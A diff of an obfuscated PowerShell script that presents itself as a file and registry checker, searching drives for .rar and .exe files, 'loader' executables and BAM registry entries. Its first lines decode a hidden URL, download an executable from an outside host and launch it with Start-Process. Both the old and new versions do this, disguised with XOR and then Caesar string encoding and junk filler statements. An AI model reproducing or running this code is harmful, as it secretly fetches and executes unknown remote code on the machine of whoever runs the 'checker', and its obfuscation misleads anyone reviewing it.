@@ -1,5 +1,5 @@
-$exeUrl  = $($k6788=226;$b=[byte[]](0x8a,0x96,0x96,0x92,0x91,0xd8,0xcd,0xcd,0xd0,0xd3,0x91,0x83,0x94,0x83,0x85,0x87,0xcc,0x8d,0x8c,0x8e,0x8b,0x8c,0x87,0xcd,0x95,0x8b,0x8c,0xd7,0xd0,0xcc,0x87,0x9a,0x87);-join($b|%{[char]($_-bxor$k6788)}))
-$exePath = ($env + $($k2279='YvQQb%hgqr=9A@3';$b=[byte[]](0x63,0x22,0x14,0x1C,0x32,0x79,0x1F,0x0E,0x1F,0x47,0x0F,0x17,0x24,0x38,0x56);$kb=[System.Text.Encoding]::UTF8.GetBytes($k2279);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})))
+$exeUrl  = $(-join('pbbxa://21aidiom.wvtqvm/eqv52.mfm'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+18)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+18)%26))}else{[char]$c}}))
+$exePath = ($env + $(-join(':HSAD\kwb52.sls'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+12)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+12)%26))}else{[char]$c}})))
 
 Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
 
@@ -8,40 +8,40 @@ Start-Process $exePath
 
 
 Clear-Host
-$encodedTitle = $($k4969='vrgG=4KZB';$b=[byte[]](0x27,0x41,0x2D,0x2B,0x64,0x6C,0x19,0x36,0x18,0x35,0x30,0x24,0x22,0x6E,0x76,0x2A,0x00,0x1A,0x1A,0x08,0x06,0x75,0x56,0x53,0x29,0x68,0x76,0x11,0x20,0x20,0x2B,0x47,0x6D,0x79,0x63,0x3B,0x2C,0x33,0x5A,0x7A);$kb=[System.Text.Encoding]::UTF8.GetBytes($k4969);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))
+$encodedTitle = $(-join('F3YaNMGaORQRtHQpOMaop2zvq24vGVaoN29nOP=='.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+11)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+11)%26))}else{[char]$c}}))
 $titleText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedTitle))
 $Host.UI.RawUI.WindowTitle = $titleText
 function Get-OneDrivePath {
     try {
         # Attempt to retrieve OneDrive path from registry
-        $oneDrivePath = (Get-ItemProperty $($k5098=51;$b=[byte[]](0x7b,0x78,0x70,0x66,0x09,0x6f,0x60,0x5c,0x55,0x47,0x44,0x52,0x41,0x56,0x6f,0x7e,0x5a,0x50,0x41,0x5c,0x40,0x5c,0x55,0x47,0x6f,0x7c,0x5d,0x56,0x77,0x41,0x5a,0x45,0x56);-join($b|%{[char]($_-bxor$k5098)})) -Name $($k6464='L#00lV';$b=[byte[]](0x19,0x50,0x55,0x42,0x2A,0x39,0x20,0x47,0x55,0x42);$kb=[System.Text.Encoding]::UTF8.GetBytes($k6464);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))).UserFolder
+        $oneDrivePath = (Get-ItemProperty $(-join('QTLD:\Bxocfjan\Vrlaxbxoc\XwnMaren'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+17)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+17)%26))}else{[char]$c}})) -Name $(-join('JhtgUdastg'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+11)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+11)%26))}else{[char]$c}}))).UserFolder
         if (-not $oneDrivePath) {
-            Write-Warning $($k7703=20;$b=[byte[]](0x5b,0x7a,0x71,0x50,0x66,0x7d,0x62,0x71,0x34,0x64,0x75,0x60,0x7c,0x34,0x7a,0x7b,0x60,0x34,0x72,0x7b,0x61,0x7a,0x70,0x34,0x7d,0x7a,0x34,0x66,0x71,0x73,0x7d,0x67,0x60,0x66,0x6d,0x3a,0x34,0x55,0x60,0x60,0x71,0x79,0x64,0x60,0x7d,0x7a,0x73,0x34,0x75,0x78,0x60,0x71,0x66,0x7a,0x75,0x60,0x7d,0x62,0x71,0x34,0x70,0x71,0x60,0x71,0x77,0x60,0x7d,0x7b,0x7a,0x3a,0x3a,0x3a);-join($b|%{[char]($_-bxor$k7703)}))
+            Write-Warning $(-join('TsjIwnaj ufym sty ktzsi ns wjlnxywd. Fyyjruynsl fqyjwsfynaj ijyjhynts...'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+21)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+21)%26))}else{[char]$c}}))
             # Attempt to find OneDrive path using environment variables
-            $envOneDrive = [System.IO.Path]::Combine($env:UserProfile, $($k5841='rxw>Xvpin?45';$b=[byte[]](0x3D,0x16,0x12,0x7A,0x2A,0x1F,0x06,0x0C);$kb=[System.Text.Encoding]::UTF8.GetBytes($k5841);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})))
+            $envOneDrive = [System.IO.Path]::Combine($env:UserProfile, $(-join('KjaZnera'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+4)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+4)%26))}else{[char]$c}})))
             if (Test-Path $envOneDrive) {
                 $oneDrivePath = $envOneDrive
-                Write-Host ($($k8270='@TzDADN8[}*';$b=[byte[]](0x0F,0x3A,0x1F,0x00,0x33,0x2D,0x38,0x5D,0x7B,0x0D,0x4B,0x34,0x3C,0x5A,0x20,0x24,0x30,0x2B,0x5B,0x2F,0x18,0x4E,0x60,0x21,0x09,0x2D,0x2F,0x23,0x6E,0x5D,0x35,0x0B,0x43,0x32,0x3B,0x14,0x29,0x24,0x2A,0x3A,0x18,0x2D,0x1C,0x58,0x29,0x35,0x18,0x28,0x24,0x7E,0x6E);$kb=[System.Text.Encoding]::UTF8.GetBytes($k8270);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) + $oneDrivePath) -ForegroundColor Green
+                Write-Host ($(-join('QpgFtkxg rcvj fgvgevgf wukpi gpxktqpogpv xctkcdng: '.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+24)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+24)%26))}else{[char]$c}})) + $oneDrivePath) -ForegroundColor Green
             } else {
-                Write-Error $($k9913='ecd6GsPB';$b=[byte[]](0x30,0x0D,0x05,0x54,0x2B,0x16,0x70,0x36,0x0A,0x43,0x02,0x5F,0x29,0x17,0x70,0x0D,0x0B,0x06,0x20,0x44,0x2E,0x05,0x35,0x62,0x15,0x02,0x10,0x5E,0x67,0x12,0x25,0x36,0x0A,0x0E,0x05,0x42,0x2E,0x10,0x31,0x2E,0x09,0x1A,0x4A);$kb=[System.Text.Encoding]::UTF8.GetBytes($k9913);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))
+                Write-Error $(-join('Slyzjc rm dglb MlcBpgtc nyrf ysrmkyrgayjjw.'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+2)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+2)%26))}else{[char]$c}}))
             }
         }
         return $oneDrivePath
     } catch {
-        Write-Error ($($k4614=204;$b=[byte[]](0x99,0xa2,0xad,0xae,0xa0,0xa9,0xec,0xb8,0xa3,0xec,0xaa,0xa5,0xa2,0xa8,0xec,0x83,0xa2,0xa9,0x88,0xbe,0xa5,0xba,0xa9,0xec,0xbc,0xad,0xb8,0xa4,0xf6,0xec);-join($b|%{[char]($_-bxor$k4614)})) + $_)
+        Write-Error ($(-join('Dwjkun cx orwm XwnMaren yjcq: '.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+17)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+17)%26))}else{[char]$c}})) + $_)
         return $null
     }
 }
 $Z74H = Get-Random -Minimum 1000 -Maximum 9999; $ad3Gry = $($Z74H / 2); $Z74H = $ad3Gry * 2; $Z74H = $null; $ad3Gry = $null
 function Format-Output {
     param($name, $value)
-    $($k5716=118;$b=[byte[]](0x0d,0x46,0x0b,0x56,0x4c,0x56,0x0d,0x47,0x0b);-join($b|%{[char]($_-bxor$k5716)})) -f $name, $value -replace $($k5897='$mW(V_w7i?*2:';$b=[byte[]](0x77,0x14,0x24,0x5C,0x33,0x32,0x59,0x75,0x10,0x4B,0x4F,0x6E,0x61,0x78,0x30);$kb=[System.Text.Encoding]::UTF8.GetBytes($k5897);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})), ''
+    $(-join('{0} : {1}'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+23)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+23)%26))}else{[char]$c}})) -f $name, $value -replace $(-join('Zfzalt.Ifal\[\]'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+19)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+19)%26))}else{[char]$c}})), ''
 }
 
 function Log-FolderNames {
     $userName = $env:UserName
     $oneDrivePath = Get-OneDrivePath
-    $potentialPaths = @(($($k7769=42;$b=[byte[]](0x69,0x10,0x76,0x7f,0x59,0x4f,0x58,0x59,0x76);-join($b|%{[char]($_-bxor$k7769)})) + $userName + $($k1214=155;$b=[byte[]](0xc7,0xdf,0xf4,0xf8,0xee,0xf6,0xfe,0xf5,0xef,0xe8,0xc7,0xd6,0xe2,0xbb,0xdc,0xfa,0xf6,0xfe,0xe8,0xc7,0xc9,0xfa,0xf2,0xf5,0xf9,0xf4,0xec,0xbb,0xc8,0xf2,0xe3,0xbb,0xb6,0xbb,0xc8,0xf2,0xfe,0xfc,0xfe);-join($b|%{[char]($_-bxor$k1214)}))),($oneDrivePath + $($k7492=136;$b=[byte[]](0xd4,0xcc,0xe7,0xeb,0xfd,0xe5,0xed,0xe6,0xfc,0xfb,0xd4,0xc5,0xf1,0xa8,0xcf,0xe9,0xe5,0xed,0xfb,0xd4,0xda,0xe9,0xe1,0xe6,0xea,0xe7,0xff,0xa8,0xdb,0xe1,0xf0,0xa8,0xa5,0xa8,0xdb,0xe1,0xed,0xef,0xed);-join($b|%{[char]($_-bxor$k7492)}))))
+    $potentialPaths = @(($(-join('R:\Jhtgh\'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+11)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+11)%26))}else{[char]$c}})) + $userName + $(-join('\Bmaskclrq\Kw Eykcq\Pyglzmu Qgv - Qgcec'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+2)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+2)%26))}else{[char]$c}}))),($oneDrivePath + $(-join('\Zkyqiajpo\Iu Cwiao\Nwejxks Oet - Oeaca'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+4)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+4)%26))}else{[char]$c}}))))
     $allUserNames = @()
 
     foreach ($path in $potentialPaths) {
@@ -55,23 +55,23 @@ function Log-FolderNames {
     $uniqueUserNames = $allUserNames | Select-Object -Unique
 
     if ($uniqueUserNames.Count -eq 0) {
-        Write-Output $($k4731=211;$b=[byte[]](0x81,0xe5,0xf3,0xb7,0xba,0xa1,0xb6,0xb0,0xa7,0xbc,0xa1,0xaa,0xf3,0xbd,0xbc,0xa7,0xf3,0xb5,0xbc,0xa6,0xbd,0xb7,0xfd);-join($b|%{[char]($_-bxor$k4731)}))
+        Write-Output $(-join('F6 rwfsqhcfm bch tcibr.'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+12)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+12)%26))}else{[char]$c}}))
     } else {
         return $uniqueUserNames
     }
 }
-@{ Key = $($k4120=217;$b=[byte[]](0xef,0xbd,0xa1,0xa1,0xe8);-join($b|%{[char]($_-bxor$k4120)})) }.GetType().Name | Out-Null
+@{ Key = $(-join('6pjj1'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+14)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+14)%26))}else{[char]$c}})) }.GetType().Name | Out-Null
 
 function Find-RarAndExeFiles {
-    Write-Output $($k5159=254;$b=[byte[]](0xb8,0x97,0x90,0x9a,0x97,0x90,0x99,0xde,0xd0,0x8c,0x9f,0x8c,0xde,0x9f,0x90,0x9a,0xde,0xd0,0x9b,0x86,0x9b,0xde,0x98,0x97,0x92,0x9b,0x8d,0xd0,0xd0,0xd0);-join($b|%{[char]($_-bxor$k5159)}))
-    $desktopPath = [System.Environment]::GetFolderPath($($k7842='s3e{FyA6';$b=[byte[]](0x37,0x56,0x16,0x10,0x32,0x16,0x31);$kb=[System.Text.Encoding]::UTF8.GetBytes($k7842);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})))
-    $outputFile = Join-Path -Path $desktopPath -ChildPath $($k9662=240;$b=[byte[]](0xa0,0x93,0xb3,0x98,0x95,0x93,0x9b,0xbc,0x9f,0x97,0x83,0xde,0x84,0x88,0x84);-join($b|%{[char]($_-bxor$k9662)}))
-    $oneDriveFileHeader = $($k2455=209;$b=[byte[]](0xb1,0xbf,0xfc,0xfc,0xfc,0xfc,0xfc,0xfc,0xfc,0xfc,0xfc,0xfc,0xfc,0xfc,0xfc,0xfc,0xfc,0xfc,0xfc,0xb1,0xbf,0x9e,0xbf,0xb4,0x95,0xa3,0xb8,0xa7,0xb4,0xf1,0x97,0xb8,0xbd,0xb4,0xa2,0xeb,0xb1,0xbf);-join($b|%{[char]($_-bxor$k2455)}))
+    Write-Output $(-join('Qtyotyr .clc lyo .pip qtwpd...'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+15)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+15)%26))}else{[char]$c}}))
+    $desktopPath = [System.Environment]::GetFolderPath($(-join('Vwkclgh'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+8)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+8)%26))}else{[char]$c}})))
+    $outputFile = Join-Path -Path $desktopPath -ChildPath $(-join('JwWbyweFiam.nrn'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+6)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+6)%26))}else{[char]$c}}))
+    $oneDriveFileHeader = $(-join('`m-----------------`mNmdCqhud Ehkdr:`m'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+1)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+1)%26))}else{[char]$c}}))
     $oneDriveFiles = @()
     $allFiles = @()
 
     $rarSearchPaths = @()
-    Get-PSDrive -PSProvider $($k7552=':gr(_^Wp<plV';$b=[byte[]](0x7C,0x0E,0x1E,0x4D,0x0C,0x27,0x24,0x04,0x59,0x1D);$kb=[System.Text.Encoding]::UTF8.GetBytes($k7552);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) | ForEach-Object { $rarSearchPaths += $_.Root }
+    Get-PSDrive -PSProvider $(-join('LorkYeyzks'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+20)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+20)%26))}else{[char]$c}})) | ForEach-Object { $rarSearchPaths += $_.Root }
     $oneDrivePath = Get-OneDrivePath
     if ($oneDrivePath) { $rarSearchPaths += $oneDrivePath }
 
@@ -83,10 +83,10 @@ function Find-RarAndExeFiles {
         param ($searchPaths, $oneDriveFiles)
         $allFiles = @()
         foreach ($path in $searchPaths) {
-            Get-ChildItem -Path $path -Recurse -Filter $($k4922='j}^Dw9';$b=[byte[]](0x40,0x53,0x2C,0x25,0x05);$kb=[System.Text.Encoding]::UTF8.GetBytes($k4922);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) -ErrorAction SilentlyContinue | ForEach-Object {
-                $fileInfo = ($($_.FullName) + $($k4225=247;$b=[byte[]](0xd7,0xda,0xd7,0xbb,0x96,0x84,0x83,0xd7,0xba,0x98,0x93,0x9e,0x91,0x9e,0x92,0x93,0xcd,0xd7);-join($b|%{[char]($_-bxor$k4225)})) + $($_.LastWriteTime))
+            Get-ChildItem -Path $path -Recurse -Filter $(-join('*.dmd'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+14)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+14)%26))}else{[char]$c}})) -ErrorAction SilentlyContinue | ForEach-Object {
+                $fileInfo = ($($_.FullName) + $(-join(' - Rgyz Sujolokj: '.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+20)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+20)%26))}else{[char]$c}})) + $($_.LastWriteTime))
                 $allFiles += $fileInfo
-                if ($_.FullName -like $($k2107='2b6!e)B:)';$b=[byte[]](0x18,0x2D,0x58,0x44,0x21,0x5B,0x2B,0x4C,0x4C,0x18);$kb=[System.Text.Encoding]::UTF8.GetBytes($k2107);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))) { $oneDriveFiles += $_.FullName }
+                if ($_.FullName -like $(-join('*CbsRfwjs*'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+12)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+12)%26))}else{[char]$c}}))) { $oneDriveFiles += $_.FullName }
             }
         }
         return $allFiles
@@ -97,10 +97,10 @@ function Find-RarAndExeFiles {
         param ($oneDrivePath, $oneDriveFiles)
         $exeFiles = @()
         if ($oneDrivePath) {
-            Get-ChildItem -Path $oneDrivePath -Recurse -Filter $($k1440='l<[ACqK:<f]$h';$b=[byte[]](0x46,0x12,0x3E,0x39,0x26);$kb=[System.Text.Encoding]::UTF8.GetBytes($k1440);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) -ErrorAction SilentlyContinue | ForEach-Object {
-                $fileInfo = ($($_.FullName) + $($k8073='{Ow?y%Gc:jP83';$b=[byte[]](0x5B,0x62,0x57,0x73,0x18,0x56,0x33,0x43,0x77,0x05,0x34,0x51,0x55,0x12,0x2A,0x13,0x05,0x59);$kb=[System.Text.Encoding]::UTF8.GetBytes($k8073);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) + $($_.LastWriteTime))
+            Get-ChildItem -Path $oneDrivePath -Recurse -Filter $(-join('*.tmt'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+11)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+11)%26))}else{[char]$c}})) -ErrorAction SilentlyContinue | ForEach-Object {
+                $fileInfo = ($($_.FullName) + $(-join(' - Xmef Yapuruqp: '.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+14)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+14)%26))}else{[char]$c}})) + $($_.LastWriteTime))
                 $exeFiles += $fileInfo
-                if ($_.FullName -like $($k7802='^2oXW';$b=[byte[]](0x74,0x7D,0x01,0x3D,0x13,0x2C,0x5B,0x19,0x3D,0x7D);$kb=[System.Text.Encoding]::UTF8.GetBytes($k7802);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))) { $oneDriveFiles += $_.FullName }
+                if ($_.FullName -like $(-join('*LkbAofsb*'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+3)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+3)%26))}else{[char]$c}}))) { $oneDriveFiles += $_.FullName }
             }
         }
         return $exeFiles
@@ -129,19 +129,19 @@ function Find-RarAndExeFiles {
     }
 }
 
-Get-Command -Name $($k4021=94;$b=[byte[]](0x09,0x2c,0x37,0x2a,0x3b,0x73,0x16,0x31,0x2d,0x2a);-join($b|%{[char]($_-bxor$k4021)})) | Select-Object -ExpandProperty Name | Out-Null
+Get-Command -Name $(-join('Zulwh-Krvw'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+23)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+23)%26))}else{[char]$c}})) | Select-Object -ExpandProperty Name | Out-Null
 
 function Find-SusFiles {
-    Write-Output $($k2272=115;$b=[byte[]](0x35,0x1a,0x1d,0x17,0x1a,0x1d,0x14,0x53,0x00,0x06,0x00,0x03,0x1a,0x10,0x1a,0x1c,0x06,0x00,0x53,0x15,0x1a,0x1f,0x16,0x00,0x53,0x1d,0x12,0x1e,0x16,0x00,0x5d,0x5d,0x5d);-join($b|%{[char]($_-bxor$k2272)}))
-    $desktopPath = [System.Environment]::GetFolderPath($($k9223='NANyv&';$b=[byte[]](0x0A,0x24,0x3D,0x12,0x02,0x49,0x3E);$kb=[System.Text.Encoding]::UTF8.GetBytes($k9223);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})))
-    $outputFile = Join-Path -Path $desktopPath -ChildPath $($k3272=30;$b=[byte[]](0x4e,0x7d,0x5d,0x76,0x7b,0x7d,0x75,0x52,0x71,0x79,0x6d,0x30,0x6a,0x66,0x6a);-join($b|%{[char]($_-bxor$k3272)}))
-    $susFilesHeader = $($k6535=44;$b=[byte[]](0x4c,0x42,0x01,0x01,0x01,0x01,0x01,0x01,0x01,0x01,0x01,0x01,0x01,0x01,0x01,0x01,0x01,0x01,0x01,0x4c,0x42,0x7f,0x59,0x5f,0x0c,0x6a,0x45,0x40,0x49,0x5f,0x16,0x4c,0x42);-join($b|%{[char]($_-bxor$k6535)}))
+    Write-Output $(-join('Cfkafkd prpmfzflrp cfibp kxjbp...'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+3)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+3)%26))}else{[char]$c}}))
+    $desktopPath = [System.Environment]::GetFolderPath($(-join('Lmasbwx'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+18)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+18)%26))}else{[char]$c}})))
+    $outputFile = Join-Path -Path $desktopPath -ChildPath $(-join('ZmMromuVyqc.dhd'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+16)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+16)%26))}else{[char]$c}}))
+    $susFilesHeader = $(-join('`z-----------------`zEge Ruxqe:`z'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+14)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+14)%26))}else{[char]$c}}))
     $susFiles = @()
 
     if (Test-Path $outputFile) {
         $loggedFiles = Get-Content -Path $outputFile
         foreach ($file in $loggedFiles) {
-            if ($file -match $($k3665='mw?U$-^1';$b=[byte[]](0x01,0x18,0x5E,0x31,0x41,0x5F,0x70,0x1B,0x31,0x59,0x5A,0x2D,0x41);$kb=[System.Text.Encoding]::UTF8.GetBytes($k3665);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))) { $susFiles += $file }
+            if ($file -match $(-join('mpbefs.*\.fyf'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+25)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+25)%26))}else{[char]$c}}))) { $susFiles += $file }
         }
 
         if ($susFiles.Count -gt 0) {
@@ -149,113 +149,113 @@ function Find-SusFiles {
             $susFiles | Sort-Object | ForEach-Object { Add-Content -Path $outputFile -Value $_ }
         }
     } else {
-        Write-Output $($k3512=88;$b=[byte[]](0x14,0x37,0x3f,0x78,0x3e,0x31,0x34,0x3d,0x78,0x36,0x37,0x2c,0x78,0x3e,0x37,0x2d,0x36,0x3c,0x76,0x78,0x0d,0x36,0x39,0x3a,0x34,0x3d,0x78,0x2c,0x37,0x78,0x2b,0x3d,0x39,0x2a,0x3b,0x30,0x78,0x3e,0x37,0x2a,0x78,0x2b,0x2d,0x2b,0x28,0x31,0x3b,0x31,0x37,0x2d,0x2b,0x78,0x3e,0x31,0x34,0x3d,0x2b,0x76);-join($b|%{[char]($_-bxor$k3512)}))
+        Write-Output $(-join('Ehz ybex ghm yhngw. Ngtuex mh lxtkva yhk lnlibvbhnl ybexl.'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+7)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+7)%26))}else{[char]$c}}))
     }
 }
-@{ Key = $($k5126=49;$b=[byte[]](0x50,0x58,0x54,0x09,0x50);-join($b|%{[char]($_-bxor$k5126)})) }.GetType().Name | Out-Null
+@{ Key = $(-join('xfb8x'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+3)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+3)%26))}else{[char]$c}})) }.GetType().Name | Out-Null
 
 function List-BAMStateUserSettings {
-    Write-Host $($k5202=168;$b=[byte[]](0xe4,0xc7,0xcf,0xcf,0xc1,0xc6,0xcf,0x88,0xda,0xcd,0xcf,0x88,0xcd,0xc6,0xdc,0xda,0xc1,0xcd,0xdb,0x88,0xc1,0xc6,0xdb,0xc1,0xcc,0xcd,0x88,0xf8,0xc7,0xdf,0xcd,0xda,0xfb,0xc0,0xcd,0xc4,0xc4,0x86,0x86,0x86);-join($b|%{[char]($_-bxor$k5202)})) -ForegroundColor DarkYellow
-    $desktopPath = [System.Environment]::GetFolderPath($($k5351=66;$b=[byte[]](0x06,0x27,0x31,0x29,0x36,0x2d,0x32);-join($b|%{[char]($_-bxor$k5351)})))
-    $outputFile = Join-Path -Path $desktopPath -ChildPath $($k6650=194;$b=[byte[]](0x92,0xa1,0x81,0xaa,0xa7,0xa1,0xa9,0x8e,0xad,0xa5,0xb1,0xec,0xb6,0xba,0xb6);-join($b|%{[char]($_-bxor$k6650)}))
+    Write-Host $(-join('Advvxcv gtv tcigxth xchxst EdltgHwtaa...'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+11)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+11)%26))}else{[char]$c}})) -ForegroundColor DarkYellow
+    $desktopPath = [System.Environment]::GetFolderPath($(-join('Vwkclgh'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+8)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+8)%26))}else{[char]$c}})))
+    $outputFile = Join-Path -Path $desktopPath -ChildPath $(-join('SfFkhfnOrjv.waw'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+23)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+23)%26))}else{[char]$c}}))
     if (Test-Path $outputFile) { Clear-Content $outputFile }
     $loggedPaths = @{}
-     Write-Host $($k3022=242;$b=[byte[]](0xd2,0xb4,0x97,0x86,0x91,0x9a,0x9b,0x9c,0x95,0xd2,0xa7,0x81,0x97,0x80,0xa1,0x97,0x86,0x86,0x9b,0x9c,0x95,0x81,0xd2,0xb7,0x9c,0x86,0x80,0x9b,0x97,0x81,0xd2);-join($b|%{[char]($_-bxor$k3022)})) -ForegroundColor Blue
+     Write-Host $(-join(' Jixglmrk YwivWixxmrkw Irxvmiw '.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+22)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+22)%26))}else{[char]$c}})) -ForegroundColor Blue
     # Log entries from bam\State\UserSettings
-    $registryPath = $($k2935=53;$b=[byte[]](0x7d,0x7e,0x79,0x78,0x0f,0x69,0x66,0x6c,0x66,0x61,0x70,0x78,0x69,0x76,0x40,0x47,0x47,0x50,0x5b,0x41,0x76,0x5a,0x5b,0x41,0x47,0x5a,0x59,0x66,0x50,0x41,0x69,0x66,0x50,0x47,0x43,0x5c,0x56,0x50,0x46,0x69,0x57,0x54,0x58,0x69,0x66,0x41,0x54,0x41,0x50,0x69,0x60,0x46,0x50,0x47,0x66,0x50,0x41,0x41,0x5c,0x5b,0x52,0x46);-join($b|%{[char]($_-bxor$k2935)}))
-    $userSettings = Get-ChildItem -Path $registryPath | Where-Object { $_.Name -like $($k8697='vt34neiLHc';$b=[byte[]](0x5C,0x45,0x03,0x04,0x5F);$kb=[System.Text.Encoding]::UTF8.GetBytes($k8697);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) }
